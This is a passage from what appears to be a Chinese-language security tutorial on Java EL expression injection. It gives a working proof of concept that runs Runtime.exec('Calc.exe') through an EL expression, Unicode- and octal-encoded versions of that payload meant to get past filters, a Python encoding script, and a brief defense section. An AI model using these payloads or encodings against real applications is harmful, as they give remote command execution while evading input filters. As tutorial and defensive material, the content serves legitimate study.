-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> drunkbaby.basicelvul;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> de.odysseus.el.ExpressionFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> de.odysseus.el.util.SimpleContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.el.ExpressionFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.el.ValueExpression;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ScriptEngineExec</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">ExpressionFactory</span> <span class="variable">expressionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExpressionFactoryImpl</span>();  </span><br><span class="line">        <span class="type">SimpleContext</span> <span class="variable">simpleContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleContext</span>();  </span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;$&#123;&#x27;&#x27;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;java.lang.Runtime.getRuntime().exec(&#x27;Calc.exe&#x27;)\&quot;)&#125;\n&quot;</span> +  <span class="string">&quot; &quot;</span>;  </span><br><span class="line">        <span class="type">ValueExpression</span> <span class="variable">valueExpression</span> <span class="operator">=</span> expressionFactory.createValueExpression(simpleContext, exp, String.class);  </span><br><span class="line">        valueExpression.getValue(simpleContext);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="BYc3S">利用 Unicode 编码绕过</h3>
-对可利用的poc进行全部或者部分的Unicode编码都是可以的
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Unicode编码内容为前面反射调用的PoC</span></span><br><span class="line">\u0024\u007b\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0065\u0078\u0065\u0063\u0027\u002c\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u006e\u0075\u006c\u006c\u0029\u002c\u0027\u0063\u0061\u006c\u0063\u002e\u0065\u0078\u0065\u0027\u0029\u007d</span><br></pre></td></tr></table></figure>
-
-<h3 id="QLpyH">利用八进制编码绕过</h3>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 八进制编码内容为前面反射调用的PoC</span></span><br><span class="line">\<span class="number">44</span>\<span class="number">173</span>\<span class="number">47</span>\<span class="number">47</span>\<span class="number">56</span>\<span class="number">147</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">103</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">163</span>\<span class="number">163</span>\<span class="number">50</span>\<span class="number">51</span>\<span class="number">56</span>\<span class="number">146</span>\<span class="number">157</span>\<span class="number">162</span>\<span class="number">116</span>\<span class="number">141</span>\<span class="number">155</span>\<span class="number">145</span>\<span class="number">50</span>\<span class="number">47</span>\<span class="number">152</span>\<span class="number">141</span>\<span class="number">166</span>\<span class="number">141</span>\<span class="number">56</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">156</span>\<span class="number">147</span>\<span class="number">56</span>\<span class="number">122</span>\<span class="number">165</span>\<span class="number">156</span>\<span class="number">164</span>\<span class="number">151</span>\<span class="number">155</span>\<span class="number">145</span>\<span class="number">47</span>\<span class="number">51</span>\<span class="number">56</span>\<span class="number">147</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">115</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">150</span>\<span class="number">157</span>\<span class="number">144</span>\<span class="number">50</span>\<span class="number">47</span>\<span class="number">145</span>\<span class="number">170</span>\<span class="number">145</span>\<span class="number">143</span>\<span class="number">47</span>\<span class="number">54</span>\<span class="number">47</span>\<span class="number">47</span>\<span class="number">56</span>\<span class="number">147</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">103</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">163</span>\<span class="number">163</span>\<span class="number">50</span>\<span class="number">51</span>\<span class="number">51</span>\<span class="number">56</span>\<span class="number">151</span>\<span class="number">156</span>\<span class="number">166</span>\<span class="number">157</span>\<span class="number">153</span>\<span class="number">145</span>\<span class="number">50</span>\<span class="number">47</span>\<span class="number">47</span>\<span class="number">56</span>\<span class="number">147</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">103</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">163</span>\<span class="number">163</span>\<span class="number">50</span>\<span class="number">51</span>\<span class="number">56</span>\<span class="number">146</span>\<span class="number">157</span>\<span class="number">162</span>\<span class="number">116</span>\<span class="number">141</span>\<span class="number">155</span>\<span class="number">145</span>\<span class="number">50</span>\<span class="number">47</span>\<span class="number">152</span>\<span class="number">141</span>\<span class="number">166</span>\<span class="number">141</span>\<span class="number">56</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">156</span>\<span class="number">147</span>\<span class="number">56</span>\<span class="number">122</span>\<span class="number">165</span>\<span class="number">156</span>\<span class="number">164</span>\<span class="number">151</span>\<span class="number">155</span>\<span class="number">145</span>\<span class="number">47</span>\<span class="number">51</span>\<span class="number">56</span>\<span class="number">147</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">115</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">150</span>\<span class="number">157</span>\<span class="number">144</span>\<span class="number">50</span>\<span class="number">47</span>\<span class="number">147</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">122</span>\<span class="number">165</span>\<span class="number">156</span>\<span class="number">164</span>\<span class="number">151</span>\<span class="number">155</span>\<span class="number">145</span>\<span class="number">47</span>\<span class="number">51</span>\<span class="number">56</span>\<span class="number">151</span>\<span class="number">156</span>\<span class="number">166</span>\<span class="number">157</span>\<span class="number">153</span>\<span class="number">145</span>\<span class="number">50</span>\<span class="number">156</span>\<span class="number">165</span>\<span class="number">154</span>\<span class="number">154</span>\<span class="number">51</span>\<span class="number">54</span>\<span class="number">47</span>\<span class="number">143</span>\<span class="number">141</span>\<span class="number">154</span>\<span class="number">143</span>\<span class="number">56</span>\<span class="number">145</span>\<span class="number">170</span>\<span class="number">145</span>\<span class="number">47</span>\<span class="number">51</span>\<span class="number">175</span></span><br></pre></td></tr></table></figure>
-
-<p><font style="color:rgb(80, 80, 92);">JohnFord </font>编码脚本如下</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str = <span class="string">&quot;$&#123;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;exec&#x27;,&#x27;&#x27;.getClass()).invoke(&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;getRuntime&#x27;).invoke(null),&#x27;calc.exe&#x27;)&#125;&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> s in str:</span><br><span class="line">  num = <span class="string">&quot;\\&quot;</span> + oct(ord(s))</span><br><span class="line">  result += num</span><br><span class="line"><span class="title function_">print</span><span class="params">(result.replace(<span class="string">&quot;\\0&quot;</span>, <span class="string">&quot;\\&quot;</span>)</span>)</span><br></pre></td></tr></table></figure>
-
-<h2 id="OILfV">防御方法</h2>
-
-<ul>
-<li>尽量不使用外部输入的内容作为EL表达式的内容</li>
-<li>若使用，严格过滤EL表达式注入漏洞payload关键字</li>
-<li>如果是排查Java程序中JURL相关代码，则搜索如下关键类方法</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javax.el.ExpressionFactory.createValueExpression()</span><br><span class="line">javax.el.ValueExpression.getValue()</span><br></pre></td></tr></table></figure>
       
     </div>
 
